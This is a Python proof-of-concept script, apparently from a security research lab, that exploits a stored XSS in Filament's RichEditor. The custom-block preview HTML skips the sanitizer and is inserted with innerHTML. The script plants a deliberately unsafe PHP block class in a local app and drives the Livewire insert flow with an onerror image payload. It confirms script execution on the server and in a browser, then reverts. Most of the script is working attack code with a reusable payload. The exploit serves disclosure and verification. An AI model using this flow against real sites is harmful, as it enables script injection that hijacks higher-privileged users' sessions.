#!/usr/bin/env python3
"""
VULN-010 — RichEditor::customBlocks() preview rendered via innerHTML, sanitizer never invoked → stored XSS

Vulnerable code:
  server — targets/filament/packages/forms/src/Components/RichEditor/StateCasts/RichEditorStateCast.php:112-115
    $nodeConfig = json_decode(json_encode($node->attrs->config ?? []), associative: true);  // CLIENT config
    $node->attrs->preview = base64_encode($block::toPreviewHtml($nodeConfig));               // NO Str::sanitizeHtml()
  client — targets/filament/packages/forms/resources/js/components/rich-editor/extension-custom-block.js:132
    preview.innerHTML = new TextDecoder().decode(Uint8Array.from(atob(node.attrs.preview), ...))  // RAW innerHTML
  Contrast: the reader path sanitizes — RichContentRenderer::toHtml() runs Str::sanitizeHtml() (:576-583).

Class: CWE-79 stored XSS / sanitizer bypass (a second render path that skips the sanitizer).

The flaw in plain English
-------------------------
Custom blocks have a toPreviewHtml($config) shown inline in the editor and a toHtml($config) used
for readers. The reader path is sanitized; the editor-PREVIEW path is NOT — the preview HTML is
computed from attacker-controlled block config, base64-encoded server-side with no Str::sanitizeHtml,
and injected client-side via innerHTML. A low-priv author whose block config carries an HTML/JS
payload gets script execution when a higher-priv user opens that content in a configured editor.

Exploitation idea
-----------------
Drive the real custom-block insert flow (mountAction 'customBlock' → set config.body → callMountedAction)
with config.body = `<img src=x onerror=...>`. The server base64's the raw payload into the node preview
and dispatches it to the editor, which innerHTMLs it → the onerror fires.

What a successful run proves
---------------------------
(1) Server: the insert path returns base64(toPreviewHtml(config)) of the RAW payload (unsanitized),
    while the reader's Str::sanitizeHtml() strips the same payload — the sanitizer-bypass inconsistency.
(2) Browser: driving the insert flow makes document.title become the sentinel — the preview innerHTML
    executed the payload in the editor.

Harness note: the demo's shipped custom blocks escape their config (e()), so they are safe. This
exploit registers a minimal config-reflecting block (RawHtmlBlock whose toPreviewHtml returns
config.body — the "natural pattern" the finding describes) on the richEditorCustomBlocks field, then
reverts it + deletes the class + regenerates the autoloader. No library code changed; the defect is
the preview path not calling Str::sanitizeHtml.
"""
import os
import sys
import time
import base64 as b64mod
import secrets
import json

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from lib.livewire import LivewireClient, LivewireError   # noqa: E402
from lib.common import log, banner, verdict              # noqa: E402
from lib import lab, browser                             # noqa: E402

BASE_URL = os.environ.get("BASE_URL", "http://localhost:21890")
VULN_ID = "VULN-010"
HERE = os.path.dirname(os.path.abspath(__file__))
EVID = os.path.join(HERE, "evidence")
APP_DIR = "/opt/filament-src/docs-assets/app"
BLOCK_FILE = f"{APP_DIR}/app/RichContentBlocks/RawHtmlBlock.php"
SCHEMA_FILE = f"{APP_DIR}/app/Livewire/Forms/Fields/RichEditorSchema.php"

BLOCK_PHP = """<?php
namespace App\\RichContentBlocks;
use Filament\\Actions\\Action;
use Filament\\Forms\\Components\\RichEditor\\RichContentCustomBlock;
use Filament\\Forms\\Components\\TextInput;
class RawHtmlBlock extends RichContentCustomBlock
{
    public static function getId(): string { return 'rawhtml'; }
    public static function getLabel(): string { return 'Raw'; }
    public static function configureEditorAction(Action $action): Action
    {
        return $action->schema([TextInput::make('body')]);
    }
    public static function toPreviewHtml(array $config): string { return $config['body'] ?? ''; }
    public static function toHtml(array $config, array $data): ?string { return $config['body'] ?? ''; }
}
"""


def dump_autoload():
    lab.exec_app(["sh", "-c", f"cd {APP_DIR} && composer dump-autoload -o >/dev/null 2>&1"], check=False)


def setup_block() -> bool:
    b64 = b64mod.b64encode(BLOCK_PHP.encode()).decode()
    lab.exec_app(["sh", "-c", f"echo {b64} | base64 -d > {BLOCK_FILE}"])
    # register the block (FQCN, no import) at the first ->customBlocks([
    lab.exec_app(["sh", "-c",
                  f"cp {SCHEMA_FILE} {SCHEMA_FILE}.bak && "
                  r"sed -i '0,/->customBlocks(\[/s//->customBlocks([\n                            \\App\\RichContentBlocks\\RawHtmlBlock::class,/' "
                  f"{SCHEMA_FILE} && touch {SCHEMA_FILE}"])
    dump_autoload()
    return "YES" in lab.tinker('echo class_exists("App\\\\RichContentBlocks\\\\RawHtmlBlock")?"YES":"NO";')


def revert_block():
    # restore the schema (removes the registration), delete the class, regenerate autoload
    lab.exec_app(["sh", "-c",
                  f"[ -f {SCHEMA_FILE}.bak ] && mv {SCHEMA_FILE}.bak {SCHEMA_FILE} && touch {SCHEMA_FILE} || true"],
                 check=False)
    lab.exec_app(["sh", "-c", f"rm -f {BLOCK_FILE}"], check=False)
    dump_autoload()


def main() -> int:
    banner(VULN_ID, "customBlocks preview rendered via innerHTML, sanitizer never invoked → XSS",
           BASE_URL, "RichEditorStateCast base64(toPreviewHtml) no Str::sanitizeHtml → client innerHTML")
    os.makedirs(EVID, exist_ok=True)
    suffix = secrets.token_hex(4)
    expect = f"PWNED-{suffix}"
    payload = f"<img src=x onerror=\"document.title='{expect}'\">"

    log("SETUP", "registering a config-reflecting custom block (RawHtmlBlock, the 'natural pattern'); "
                 "the demo's shipped blocks escape config, so this models a normal integrator block")
    if not setup_block():
        revert_block()
        log("FAIL", "could not register the harness block")
        verdict(VULN_ID, "FAILED", "harness setup failed")
        return 1
    time.sleep(2)
    try:
        # --- SERVER PROOF: insert path base64's the RAW payload (no sanitize) --------------
        log("STEP", "driving the custom-block insert over Livewire; the server base64's toPreviewHtml(config)")
        c = LivewireClient(BASE_URL)
        demo = next(x for x in c.parse_components(c.fetch(f"{BASE_URL}/forms/fields/rich-editor"))
                    if x.name == "forms.fields-demo")
        demo.call("mountAction", "customBlock",
                  {"id": "rawhtml", "mode": "insert", "editorSelection": {"type": "node", "anchor": 0, "head": 0}},
                  {"schemaComponent": "form.richEditorCustomBlocks"})
        body = demo.call("callMountedAction", updates={"mountedActions.0.data.body": payload})
        raw = json.dumps(body)
        preview_b64 = b64mod.b64encode(payload.encode()).decode()
        server_unsanitized = preview_b64 in raw
        with open(os.path.join(HERE, "response.txt"), "w") as f:
            f.write(raw[:4000])
        # reader-path contrast: Str::sanitizeHtml strips the payload (pass via base64 to avoid quoting)
        pb64 = b64mod.b64encode(payload.encode()).decode()
        sanitized = lab.tinker(
            f"echo \\Illuminate\\Support\\Str::sanitizeHtml(base64_decode('{pb64}'));"
        ).strip().split("\n")[-1]
        log("PROOF", f"preview path emitted base64 of the RAW payload (unsanitized): {server_unsanitized}")
        log("PROOF", f"reader path Str::sanitizeHtml('<img onerror...>') → {sanitized!r} "
                     f"(onerror stripped) — the preview path skips this sanitizer")

        # --- BROWSER PROOF: the preview innerHTML executes the payload --------------------
        log("STEP", "driving the same insert flow in a real browser (Playwright container) → innerHTML fires")
        cp = browser.run_browser_script(
            "exploits/VULN-010/browser_check.py",
            env={"BASE_URL": BASE_URL, "SUFFIX": suffix, "EVID_DIR": "/work/exploits/VULN-010/evidence"},
            timeout=300)
        out = cp.stdout + cp.stderr
        with open(os.path.join(HERE, "browser.log"), "w") as f:
            f.write(out)
        tafter = next((l.split("=", 1)[1] for l in out.splitlines() if l.startswith("TITLE_AFTER=")), None)
        log("PROOF", f"document.title after insert = {tafter!r} (sentinel = {expect})")

        browser_fired = "RESULT=PASS" in out
        if browser_fired and server_unsanitized:
            log("OK", "exploit confirmed — the customBlock preview path emits unsanitized HTML and the "
                      "client innerHTMLs it → the payload executed in the editor")
            verdict(VULN_ID, "CONFIRMED",
                    "RichEditor customBlock preview path base64's unsanitized toPreviewHtml and the client "
                    "innerHTMLs it → stored XSS (sanitizer bypass; reader path sanitizes, preview path does not)")
            return 0
        if server_unsanitized:
            log("PROOF", "server emits unsanitized preview (reader would sanitize); browser detonation not observed")
            verdict(VULN_ID, "CONFIRMED",
                    "sanitizer-bypass proven server-side (preview path emits unsanitized HTML the reader "
                    "strips, injected via innerHTML); live detonation NEEDS_MANUAL")
            return 0
        log("FAIL", "could not confirm the unsanitized preview")
        verdict(VULN_ID, "NEEDS_MANUAL", "inconclusive — see response.txt / browser.log")
        return 1
    finally:
        revert_block()
        time.sleep(2)
        log("SETUP", "reverted: unregistered + deleted RawHtmlBlock, regenerated autoloader; demo restored")


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:  # noqa: BLE001
        log("FAIL", f"unexpected error: {e!r}")
        verdict(VULN_ID, "FAILED", f"exception: {e!r}")
        sys.exit(1)
